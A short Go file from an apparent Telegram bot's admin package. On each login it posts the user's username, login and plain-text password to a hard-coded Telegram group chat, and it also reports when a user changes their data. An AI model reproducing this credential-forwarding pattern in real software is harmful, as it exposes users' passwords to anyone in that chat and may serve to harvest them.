package admin

import tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"

func HandlerAdminIfLogin(bot *tgbotapi.BotAPI, username, login, password string) {
	bot.Send(tgbotapi.NewMessage(-4801118127, "Пользователь @" + username + " авторизовался\n|" + login + "|\n" + "|" + password + "|"))
}

func HandlerAdminIfUpdate(bot *tgbotapi.BotAPI, username string) {
	bot.Send(tgbotapi.NewMessage(-4801118127, "Пользователь @" + username + " изменил данные"))
}